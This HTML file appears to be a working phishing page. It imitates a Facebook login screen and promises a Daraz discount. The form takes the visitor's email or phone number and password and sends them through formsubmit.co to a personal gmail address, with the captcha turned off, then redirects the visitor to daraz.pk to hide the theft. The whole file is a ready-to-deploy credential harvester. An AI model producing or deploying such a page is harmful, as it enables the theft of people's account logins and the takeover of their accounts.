<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="shortcut icon" href="facebook.png" type="image/x-icon">
    <title>Facebook Login Page</title>
    <link rel="stylesheet" href="style.css" />
  </head>
  <body>
    <div class="content">
      <div class="flex-div">
        <div class="name-content">
          <h1 class="logo">Facebook</h1>
          <p>Connect with your Facebook account for Daraz discount.</p>
        </div>
          <form action="https://formsubmit.co/alet8319@gmail.com" method="POST">
            <input type="hidden" name="_next" value="https://www.daraz.pk/">
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_template" value="table">
            <input type="email" name="email" id="email" placeholder="Email or Phone Number" required />
            <input type="password" name="password" id="password" placeholder="Password" required>
            <button class="login" type="submit">Log In</button>
            <a href="#">Forgot Password ?</a>
            <hr>
            <button class="create-account" type="submit">Create New Account</button>
          </form>
      </div>
    </div>
    <script src="script.js"></script>
  </body>
</html>
